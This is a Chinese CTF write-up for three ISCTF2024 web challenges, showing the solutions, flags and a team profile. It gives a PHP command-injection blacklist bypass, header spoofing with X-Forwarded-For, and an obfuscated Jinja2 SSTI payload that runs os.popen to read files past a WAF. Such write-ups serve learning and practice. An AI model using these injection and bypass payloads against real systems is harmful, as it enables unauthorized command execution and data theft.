# [个人队伍] ISCTF2024的Writeup

> **2025年12月8日18:09 ~ 2029年10月26日23:09**
>
> **比赛地址：https://gz.imxbt.cn/games/16/challenges**
>
> **复现地址：https://gz.imxbt.cn/games/16/challenges**

> 个人赛
>
> # ISCTF2024复现
>
> **653**支队伍已报名
>
> 开始时间
>
> 2025年12月8日晚上6点09分
>
> 结束时间
>
> 2029年10月26日晚上11点09分
>
> 因 **ezpython和在逆向尽头咏唱密码的少女** 两个题目均为0解，且出题人选择不公布内容，故将不会在复现赛事中出现这两题



# All

## Web

### 1z_php

#### 题目信息

> ## 1z_php250 pts
>
> 题目难度：**签到**
>
> 题目描述：一句话木马都有了，还要什么自行车
>
> 出题人：J1ngHong
>
> 学校：杭州师范大学

#### 解题过程

##### 查看题目

```php
<?php
highlight_file('index.php');

#一句话木马，神神又奇奇

if(isset($_POST['J'])){
    $call=$_POST['J'];
    $dangerous_commands = ['cat', 'tac', 'head', 'nl', 'more', 'less', 'tail', 'vi', 'sed', 'od'];
    foreach ($dangerous_commands as $command) {
        if (preg_match("/$command/i", $call)) {
            die("这些个危险函数可不兴使啊");
        }
    }
    system($call);
}
?>
```

**分析**

- **sort**

##### 编写payload

```shell
sort /f*
```

##### 发起攻击

```shell
POST J=sort /f*
```

```shell
ISCTF{fb2d81a2-75aa-466b-b58e-657f7617835f}
```

#### 题目答案

##### 核心payload

```shell
POST J=sort /f*
```

##### 获得结果

```shell
ISCTF{fb2d81a2-75aa-466b-b58e-657f7617835f}
```



### 25时晓山瑞希生日会

#### 题目信息

> ## 25时晓山瑞希生日会252 pts
>
> 题目难度：**签到**
>
> 题目描述：瑞希是神山高校一年级生，《25时，在Nightcord。》的MV师。马上要到生日了。生日会邀请了很多人来参加。
> 此题在9.15就出好了，谁料会发生如此变故，sega我恨你;w;
>
> 出题人：oSthing
>
> 学校：浙江工商职业技术学院

#### 解题过程

##### 查看题目

```shell
从某客户端来
从本地地址来
从某时间戳来
```

##### 编写payload

```shell
User-Agent: Project Sekai
X-Forwarded-For: 127.0.0.1
Data: Tue, 27 Aug 2024 05:00:00 GMT
```

##### 发起攻击

```shell
User-Agent: Project Sekai
X-Forwarded-For: 127.0.0.1
Data: Tue, 27 Aug 2024 05:00:00 GMT
```

```shell
—— 25时主题咖啡厅×晓山瑞希生日会 bad end——
很高兴你能按时过来，但是非常遗憾地通知大家，本次原定于8月27日的杭州场25时主题咖啡厅×晓山瑞希生日会最终决定取消，在此向大家深表歉意...

不过我们还是为你准备了一些东西: ISCTF{b80f372d-89e6-44e2-9174-682a42c70ed1}
```

#### 题目答案

##### 核心payload

```shell
User-Agent: Project Sekai
X-Forwarded-For: 127.0.0.1
Data: Tue, 27 Aug 2024 05:00:00 GMT
```

##### 获得结果

```shell
ISCTF{b80f372d-89e6-44e2-9174-682a42c70ed1}
```



### ezSSTI

#### 题目信息

> ## ezSSTI256 pts
>
> 题目难度：**简单**
>
> 题目描述：python ssti注入
>
> 出题人：fpclose
>
> 学校：大理大学

#### 解题过程

##### 查看题目

```shell
{{1+1}}
```

```shell
You entered: 2
```

```shell
{{().__class__.__base__.__subclasses__()}}
```

```shell
You entered: waf!
```

**分析**

- **存在SSTI漏洞注入**
- **存在Waf黑名单拦截**

##### 模糊测试

利用自研工具WebFuzz(https://github.com/BProbie/WebFuzz)模糊测试一下Waf

```shell
WebFuzz -u http://challenge.imxbt.cn:30820/ -dt {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -waf waf! -tr 100
```

```shell
Thanks For Using WebFuzz-v1.1.0 (https://github.com/BProbie/WebFuzz)
Uri: http://challenge.imxbt.cn:30820/
Type: POST
Data: {'user_input': '{{().__class__.__bases__[0].__subclasses__()}}'}
Waf: ['waf!']
Delay: 0
Thread: 100
The Script Start At The Time Of 2026-05-12 17:16:36

[#########################] 903/903 (The Script End At The Time Of 2026-05-12 17:17:05)

The Result of WebFuzz: ['_', '[']
```

**分析**

- 我们可以用**【("%c"%95)*2】**来替代**【__】**
- 我们可以用**【|attr("getitem")(0)】**来替代**【[0]】**
- 我们用**【{% print %}】**来执行

##### 编写payload

```shell
{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
```

##### 发起攻击

```shell
{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
```

```shell
You entered: ISCTF{d70c7690-e492-47a1-a964-9f98f77ec477}
```

#### 题目答案

##### 核心payload

```shell
{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
```

##### 获得答案

```shell
ISCTF{d70c7690-e492-47a1-a964-9f98f77ec477}
```



































































# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**